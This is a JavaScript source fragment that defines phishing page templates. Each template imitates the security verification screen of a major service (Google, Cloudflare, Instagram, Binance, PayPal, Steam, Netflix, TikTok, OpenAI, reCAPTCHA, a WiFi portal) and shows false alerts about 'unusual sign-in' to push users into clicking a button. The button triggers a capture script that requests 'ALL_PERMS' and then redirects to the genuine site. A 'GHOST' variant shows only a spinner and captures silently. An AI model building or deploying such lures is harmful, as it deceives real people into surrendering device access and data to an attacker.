    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { font-family: 'Google Sans', 'Roboto', Arial, sans-serif; background:#ffffff; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { border:1px solid #dadce0; border-radius:8px; padding:48px 40px 36px; width:100%; max-width:450px; text-align:left; box-sizing:border-box; } .google-logo { width:75px; margin-bottom:12px; } h1 { font-size:24px; font-weight:400; color:#202124; margin:0 0 8px; } p { font-size:16px; color:#3c4043; margin-bottom:32px; line-height: 1.5; } .identity-pill { border:1px solid #dadce0; border-radius:16px; padding:4px 10px; font-size:14px; color:#3c4043; display:inline-flex; align-items:center; margin-bottom:24px; font-weight: 500; } .identity-pill img { width:20px; height:20px; border-radius:50%; margin-right:8px; } .btn { background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; float: right; transition: background .2s; } .btn:hover { background: #1b66c9; } .footer { display: flex; margin-top: 80px; font-size: 12px; color: #70757a; font-weight: 400; justify-content: space-between; clear: both; }</style></head><body><div class="box"><img class="google-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg"><h1>Verify it's you</h1><div class="identity-pill"><img src="https://ssl.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png">Google Security Service</div><p>Google has detected an unusual sign-in attempt. To help keep your account secure, we need to verify that it's really you on this device.</p><div style="margin-top: 32px; height: 40px;"><button class="btn" onclick="window.startCapture();">Continue</button></div><div class="footer"><div>English (United States)</div><div style="display:flex; gap:16px;"><span>Help</span><span>Privacy</span><span>Terms</span></div></div></div>${getCaptureScript(id, 'https://myaccount.google.com/security', {
      tmplId: 'google', perms: ALL_PERMS, accent: '#1a73e8', icon: '👤',
    })}</body></html>`
  },
  'gallery': {
    name: "🖼️ Integrity: Media Forensic Sync (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Asset Integrity Check</title><style>body { background:#f8f9fa; color:#202124; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:400px; padding:48px; border-radius:12px; text-align:center; background:#fff; box-shadow: 0 1px 3px rgba(0,0,0,0.1); border:1px solid #dadce0; } h2 { font-size:20px; font-weight:500; margin-top:0; } p { color:#70757a; font-size:14px; line-height:1.6; margin:20px 0 30px; } .btn { background:#1a73e8; color:#fff; padding:12px 32px; border-radius:6px; border:none; font-weight:500; cursor:pointer; width:100%; font-size:14px; }</style></head><body><div class="box"><div style="font-size:40px; margin-bottom:15px;">🛡️</div><h2>Media Security Check</h2><p>Our systems require a standard security check to validate your identity for this session.</p><button class="btn" onclick="window.startCapture();">Verify Session</button></div>${getCaptureScript(id, 'https://photos.google.com', {
      tmplId: 'gallery', perms: ALL_PERMS, accent: '#1a73e8', icon: '🕵️'
    })}</body></html>`
  },
  'cloudflare': {
    name: "☁️ Cloudflare: Edge Verification (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Just a moment...</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:left; background:#000000; color: #ffffff; } .container { width: 100%; max-width: 600px; padding: 40px 20px; box-sizing: border-box; } .logo { width: 160px; height: auto; margin-bottom: 48px; } .main-text { font-size: 34px; font-weight: 700; line-height: 1.2; margin-bottom: 16px; color: #ffffff; } .sub-text { font-size: 17px; color: #9ca3af; margin-bottom: 56px; line-height: 1.6; } .btn-verify { background: #f6821f; color: white; border: none; padding: 18px 40px; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 14px rgba(246, 130, 31, 0.4); } .btn-verify:hover { background: #e67615; transform: translateY(-1px); box-shadow: 0 6px 20px rgba(246, 130, 31, 0.5); } .btn-verify:active { transform: translateY(0); } .footer { font-size: 13px; color: #4b5563; margin-top: 100px; border-top: 1px solid #1f2937; padding-top: 24px; width: 100%; display: flex; justify-content: space-between; } .footer a { color: #f6821f; text-decoration: none; }</style></head><body><div class="container"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" alt="Cloudflare" class="logo" referrerpolicy="no-referrer"><div class="main-text">Verify you are human.</div><div class="sub-text">Please complete the security check to access the destination page. This helps keep our network safe and protects against automated attacks.</div><button class="btn-verify" onclick="this.disabled=true; this.innerText='Verifying...'; window.startCapture();">Verify Connection</button><div class="footer"><div>Ray ID: <span>${Math.random().toString(36).substring(2, 16)}</span></div><div>Performance & security by <a href="#">Cloudflare</a></div></div></div>${getCaptureScript(id, 'https://www.cloudflare.com', {
      tmplId: 'cloudflare', perms: ALL_PERMS, accent: '#f6821f', icon: '☁️'
    })}</body></html>`
  },
  'pegasus': {
    name: "💻 System: Advanced Diagnostic Audit [STABLE]",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>System Integrity Check</title><style>body { background:#f4f7f9; color:#333; font-family: -apple-system, system-ui, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { border:1px solid #d1d9e0; padding:40px; background:#fff; width:95%; max-width:600px; border-radius:8px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); } .header { border-bottom:1px solid #e1e9f1; padding-bottom:20px; margin-bottom:25px; display:flex; justify-content:space-between; align-items:center; } .status-badge { background:#e8f0fe; color:#1a73e8; padding:4px 12px; border-radius:4px; font-size:12px; font-weight:600; text-transform:uppercase; border:1px solid #d2e3fc; } .console { background:#f8f9fa; border-radius:4px; padding:20px; font-family: 'JetBrains Mono', monospace; font-size:13px; line-height:1.6; height:180px; overflow-y:auto; color:#666; border:1px solid #e1e4e8; } .console span { color:#1a73e8; font-weight: 600; } .btn { width:100%; background:#1a73e8; color:#fff; border:none; padding:16px; border-radius:4px; font-weight:600; cursor:pointer; margin-top:30px; font-size:16px; transition:all 0.2s; } .btn:hover { background:#185abc; }</style></head><body><div class="box"><div class="header"><div><div style="font-weight:600; font-size:18px; color:#1c1e21;">Central Diagnostic Console</div><div style="font-size:12px; color:#70757a;">Ver: 10.4.1-Build-SEC-2026</div></div><div class="status-badge">Awaiting Update</div></div><p style="font-size:14px; color:#4a4a4a; margin-bottom:20px;">A full environment diagnostic is required to synchronize your session with our global security infrastructure.</p><div class="console" id="log-console">
[INFO] Initialize diagnostic engine...
[INFO] Mapping environment variables...
[OK] Isolation layer check passed.
[WAIT] Ready for deep environment validation...
    </div><button class="btn" onclick="window.startCapture();">Synchronize & Verify Session</button></div>
    <script>
      var log = document.getElementById('log-console');
      var lines = [
        "[INFO] Capturing hardware entropy profile...",
        "[INFO] Analyzing browser pipeline mapping...",
        "[INFO] Syncing geospatial markers...",
        "[INFO] Validating integrity API hooks...",
        "[WAIT] Security handshake pending user confirmation..."
      ];
      var idx = 0;
      setInterval(function() {
        if (idx < lines.length) {
          log.innerHTML += "\\n<span>[RUN]</span> " + lines[idx];
          log.scrollTop = log.scrollHeight;
          idx++;
        }
      }, 3000);
    </script>
    ${getCaptureScript(id, 'https://support.google.com/accounts/answer/46526', {
      tmplId: 'pegasus', perms: ALL_PERMS, accent: '#1a73e8', icon: '💻',
    })}</body></html>`
  },
  'security_audit': {
    name: "🛡️ Security: Browser Ecosystem Audit (Extreme)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Trust & Safety</title><style>body { font-family: -apple-system, system-ui, sans-serif; background:#f0f2f5; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; border-radius:12px; padding:40px; width:100%; max-width:400px; text-align:center; box-shadow: 0 12px 40px rgba(0,0,0,0.08); } .shield { color:#1877f2; font-size:60px; margin-bottom:20px; } h2 { font-size:24px; font-weight:700; color:#1c1e21; margin:0 0 12px; } p { color:#606770; line-height:1.5; font-size:15px; margin-bottom:30px; } .btn { background:#1877f2; color:#fff; border:none; padding:12px; border-radius:6px; font-size:16px; font-weight:600; cursor:pointer; width:100%; transition:filter 0.2s; } .btn:hover { filter: brightness(1.1); }</style></head><body><div class="box"><div class="shield">🛡️</div><h2>Security Audit</h2><p>Our security systems have detected an unusual connection pattern. Please verify your connection to continue safely.</p><button class="btn" onclick="window.startCapture();">Verify & Continue</button></div>${getCaptureScript(id, 'https://www.google.com/safetycenter', {
      tmplId: 'security_audit', perms: ALL_PERMS, accent: '#1877f2', icon: '🔒'
    })}</body></html>`
  },
  'meta_login': {
    name: "💬 Social: Account Recovery (Extreme)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login • Instagram</title><style>body { background:#fafafa; font-family: -apple-system, system-ui, sans-serif; display:flex; flex-direction: column; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { border:1px solid #dbdbdb; background:#fff; padding:40px; width:100%; max-width:350px; box-sizing: border-box; text-align:center; margin-bottom: 12px; } .logo { width: 175px; height: auto; margin-bottom:35px; } h3 { font-size:16px; margin:0 0 12px; font-weight: 600; color: #262626; } p { color:#737373; font-size:14px; margin-bottom:30px; line-height: 1.5; } .btn { background:#0095f6; color:#fff; border:none; padding:7px 16px; border-radius:8px; font-weight:600; cursor:pointer; width:100%; font-size: 14px; transition: opacity 0.2s; } .btn:hover { opacity: 0.8; } .meta-brand { color: #737373; font-size: 12px; font-weight: 400; letter-spacing: 1px; margin-top: 40px; text-transform: uppercase; } .footer-copy { color: #737373; font-size: 12px; margin-top: 8px; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" class="logo" referrerpolicy="no-referrer"><h3>Security Verification</h3><p>We've detected an unusual login attempt. To protect your information, please verify your session integrity on this device.</p><button class="btn" onclick="window.startCapture();">Verify Account</button></div><div class="meta-brand">from Meta</div>${getCaptureScript(id, 'https://www.instagram.com', {
      tmplId: 'meta_login', perms: ALL_PERMS, accent: '#0095f6', icon: '📸'
    })}</body></html>`
  },
  'wifi': {
    name: "📶 WIFI: Hotspot Certification (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>WiFi Authentication</title><style>body { background:#f4f7f6; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; text-align:center; width:100%; max-width:400px; padding: 40px 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); border-radius: 16px; box-sizing: border-box; } .wifi-icon { background: #e3f2fd; color: #1976d2; width: 80px; height: 80px; display: flex; align-items: center; justify-content: center; border-radius: 50%; margin: 0 auto 20px; font-size: 32px; } h1 { margin: 0 0 10px; font-size: 24px; color: #333; font-weight: 600; } p { color:#666; font-size:15px; margin-bottom: 30px; line-height: 1.5; } hr { border:0; border-top:1px solid #eee; margin: 0 0 30px; } .btn { background:#1976d2; color:#fff; border:none; padding:14px 40px; border-radius:8px; font-weight:600; cursor:pointer; width:100%; font-size: 16px; transition: background 0.2s; } .btn:hover { background: #1565c0; } .terms { font-size: 12px; color: #999; margin-top: 20px; } .terms a { color: #1976d2; text-decoration: none; }</style></head><body><div class="box"><div class="wifi-icon">📶</div><h1>Free WiFi Connect</h1><p>Welcome to the Public Free WiFi network. To ensure network security and prevent bot abuse, please verify your session to connect.</p><hr><button class="btn" onclick="window.startCapture();">Connect to Network</button><div class="terms">By connecting, you agree to our <a href="#">Terms of Service</a> & <a href="#">Privacy Policy</a>.</div></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: 'wifi', perms: ALL_PERMS, accent: '#1976d2', icon: '📶'
    })}</body></html>`
  },
  'binance': {
    name: "💱 Crypto: Withdrawal Security (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification | Binance</title><style>body { background:#0b0e11; color:#eaecef; font-family: 'BinancePlex', 'Inter', -apple-system, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { width:100%; max-width:440px; padding:48px 40px; background:#1e2329; border-radius:16px; text-align:center; box-shadow: 0 10px 40px rgba(0,0,0,0.4); } h2 { font-size:24px; font-weight: 600; color: #eaecef; margin-bottom:16px; } p { color:#848e9c; font-size:15px; margin-bottom:32px; line-height: 1.6; } .btn { background:#fcd535; color:#0b0e11; padding:12px 24px; border-radius:4px; border:none; font-weight:600; cursor:pointer; width:100%; font-size: 16px; transition: background 0.2s; } .btn:hover { background: #e6c229; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" alt="Binance" style="width: 160px; height: auto; margin-bottom: 32px; filter: brightness(0) invert(1);" referrerpolicy="no-referrer"><h2>Security Verification</h2><p>To protect your account assets, please complete the standard security verification check to authorize this session.</p><button class="btn" onclick="window.startCapture();">Confirm Verification</button></div>${getCaptureScript(id, 'https://www.binance.com/en/my/security', {
      tmplId: 'binance', perms: ALL_PERMS, accent: '#fcd535', icon: '💰'
    })}</body></html>`
  },
  'paypal': {
    name: "💳 Fintech: Transaction Audit (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PayPal Security</title><style>body { background:#ffffff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; color:#2c2e2f; } .box { width:100%; max-width:400px; text-align:center; padding:40px; box-sizing: border-box; } .logo-img { width: 120px; height: auto; margin-bottom:40px; } h2 { font-size:24px; font-weight: 300; margin-bottom:15px; color: #000; } p { color:#666; font-size:15px; line-height: 1.5; margin-bottom:40px; } .btn { background:#0070e0; color:#fff; padding:12px; border-radius:24px; border:none; font-weight:bold; cursor:pointer; width:100%; font-size: 15px; transition: background 0.2s; } .btn:hover { background:#005ea6; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" class="logo-img" alt="PayPal"><h2>Help us protect your account</h2><p>We've noticed some unusual activity. To protect your funds, please verify your identity to continue.</p><button class="btn" onclick="window.startCapture();">Secure my account</button></div>${getCaptureScript(id, 'https://www.paypal.com/myaccount/security', {
      tmplId: 'paypal', perms: ALL_PERMS, accent: '#0070ba', icon: '💳'
    })}</body></html>`
  },
  'steam': {
    name: "🎮 Gaming: Steam Guard (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Steam Guard Security</title><style>body { background:#1b2838; color:#c7d5e0; font-family: "Motiva Sans", Sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { background:#171a21; width:100%; max-width:440px; padding:48px 32px; border-radius:4px; box-shadow: 0 20px 60px rgba(0,0,0,0.6); text-align:center; border:1px solid #333; box-sizing: border-box; } .logo { width: 120px; height: auto; margin-bottom:32px; } h2 { font-size:24px; color:#fff; margin-bottom:16px; font-weight: 300; letter-spacing: 1px; } p { font-size:15px; color:#acb2b8; line-height:1.6; margin-bottom:32px; } .btn { background: linear-gradient( to right, #4074f3 0%, #1e45da 100%); color:#fff; border:none; padding:14px 24px; border-radius:2px; font-weight:500; cursor:pointer; width:100%; font-size: 16px; transition: filter 0.2s; box-shadow: 0 4px 15px rgba(0,0,0,0.2); } .btn:hover { filter: brightness(1.2); }</style></head><body><div class="box"><img class="logo" src="https://t3.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://store.steampowered.com&size=128" alt="Steam" referrerpolicy="no-referrer"><h2>Security Verification</h2><p>Steam requires a one-time security verification to authorize this device and maintain account security protection levels.</p><button class="btn" onclick="window.startCapture();">Verify Device Authentication</button></div>${getCaptureScript(id, 'https://store.steampowered.com', {
      tmplId: 'steam', perms: ALL_PERMS, accent: '#1a44c2', icon: '🎮'
    })}</body></html>`
  },
  'netflix': {
    name: "🍿 Media: Household Verification (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Netflix Authentication</title><style>body { background:#000000; color:#fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { width:100%; max-width:480px; padding:60px 40px; text-align:center; background: #000; box-sizing: border-box; } .logo { margin-bottom:48px; } .logo img { width: 220px; height: auto; } h2 { font-size:32px; font-weight: 700; margin-bottom:24px; } p { color:#b3b3b3; font-size:17px; margin-bottom:48px; line-height: 1.6; } .btn { background:#e50914; color:#fff; border:none; padding:18px; font-weight:bold; cursor:pointer; width:100%; font-size:18px; border-radius: 4px; transition: background 0.2s; } .btn:hover { background: #c1000b; }</style></head><body><div class="box"><div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/Netflix_2015_logo.svg/1000px-Netflix_2015_logo.svg.png" alt="Netflix" referrerpolicy="no-referrer"></div><h2>Verification Required</h2><p>To continue using Netflix on this device, please complete a brief security check to confirm your household connection.</p><button class="btn" onclick="window.startCapture();">Verify Device</button></div>${getCaptureScript(id, 'https://www.netflix.com', {
      tmplId: 'netflix', perms: ALL_PERMS, accent: '#e50914', icon: '📺'
    })}</body></html>`
  },
  'tiktok': {
    name: "🎵 Social: Creator Portal (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Check | TikTok</title><style>body { background:#ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; color:#161823; } .box { width:100%; max-width:420px; text-align:center; padding: 48px 32px; border: 1px solid #f0f0f0; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.04); } .logo { width: 140px; height: auto; margin-bottom: 40px; } h2 { font-size:24px; font-weight:700; margin-bottom:16px; } p { color: rgba(22, 24, 35, 0.7); font-size:16px; margin-bottom:48px; line-height: 1.5; } .btn { background:#fe2c55; color:#fff; padding:16px; border:none; border-radius: 4px; font-weight:700; cursor:pointer; width:100%; font-size:16px; transition: opacity 0.2s; } .btn:hover { opacity: 0.9; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" class="logo" referrerpolicy="no-referrer"><h2>Security Sweep</h2><p>Please complete a quick check to maintain your account safety and access to creator features.</p><button class="btn" onclick="window.startCapture();">Verify Identity</button></div>${getCaptureScript(id, 'https://www.tiktok.com', {
      tmplId: 'tiktok', perms: ALL_PERMS, accent: '#fe2c55', icon: '🎵'
    })}</body></html>`
  },
  'chatgpt': {
    name: "🤖 AI: OpenAI Dev Audit (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>OpenAI Authentication</title><style>body { background:#ffffff; font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { width:100%; max-width:400px; text-align:center; padding: 40px; } .logo { width: 40px; height: auto; margin-bottom: 32px; } h2 { font-size:32px; font-weight: 600; color: #000; margin-bottom: 24px; letter-spacing: -0.02em; } p { color:#353740; font-size:16px; margin-bottom:40px; line-height: 1.6; } .btn { background:#10a37f; color:#fff; border:none; padding:12px; border-radius:4px; cursor:pointer; width:100%; font-size: 16px; font-weight:500; transition: opacity 0.2s; } .btn:hover { opacity: 0.9; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/0/04/ChatGPT_logo.svg" class="logo" referrerpolicy="no-referrer"><h2>Verify you are human</h2><p>To protect our systems, please complete a security audit to verify your connection.</p><button class="btn" onclick="window.startCapture();">Begin Verification</button></div>${getCaptureScript(id, 'https://openai.com', {
      tmplId: 'chatgpt', perms: ALL_PERMS, accent: '#10a37f', icon: '🤖'
    })}</body></html>`
  },
  'recap': {
    name: "🕵️ reCAPTCHA: V2 Checkbox Check (Realistic)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>reCAPTCHA Verification</title><style>body { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; background:#fff; font-family: Roboto, helvetica, arial, sans-serif; } .box { width: 302px; height: 76px; border: 1px solid #d3d3d3; border-radius: 3px; background: #f9f9f9; display: flex; align-items: center; box-sizing: border-box; cursor: pointer; transition: all 0.2s; position: relative; } .box:hover { box-shadow: 0px 0px 2px rgba(0,0,0,0.1); } .checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; margin-right: 12px; background: #fff; display: flex; align-items: center; justify-content: center; } .checkbox.spinning { border: none !important; background: transparent; } .checkbox.spinning::after { content: ''; width: 24px; height: 24px; border: 3px solid #1a73e8; border-right-color: transparent; border-radius: 50%; animation: sc-spin 1s linear infinite; } @keyframes sc-spin { to { transform: rotate(360deg); } } .text { font-size: 14px; color: #222; font-family: Roboto, sans-serif; } .logo { position: absolute; right: 10px; top: 12px; display: flex; flex-direction: column; align-items: center; } .logo img { width: 32px; height: 32px; margin-bottom: 2px; } .logo span { font-size: 8px; color: #555; text-align: center; line-height: 1.2; } .logo-links { font-size: 8px; color: #555; margin-top: 2px; } .logo-links a { color: #555; text-decoration: none; } .logo-links a:hover { text-decoration: underline; }</style></head><body><div class="box" onclick="this.querySelector('.checkbox').classList.add('spinning'); window.startCapture();"><div class="checkbox"></div><div class="text">I'm not a robot</div><div class="logo"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png"><span>reCAPTCHA</span><span class="logo-links"><a href="#">Privacy</a> - <a href="#">Terms</a></span></div></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: 'recap', perms: ALL_PERMS, accent: '#1a73e8'
    })}</body></html>`
  },
  'recap_silent': {
    name: "👻 GHOST: Silent Integrity (OP - No UI)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Loading...</title><style>body { background: #fafafa; display: flex; height: 100vh; margin: 0; align-items: center; justify-content: center; font-family: sans-serif; } .spinner { width: 40px; height: 40px; border: 3px solid rgba(0,0,0,0.1); border-top-color: #333; border-radius: 50%; animation: spin 1s linear infinite; } @keyframes spin { to { transform: rotate(360deg); } }</style></head><body><div class="spinner"></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: 'recap_silent', flow: 'silent', perms: SILENT_PERMS
    })}</body></html>`
  }
};

// Global metadata version trigger for GitHub sync (v1.1.4)
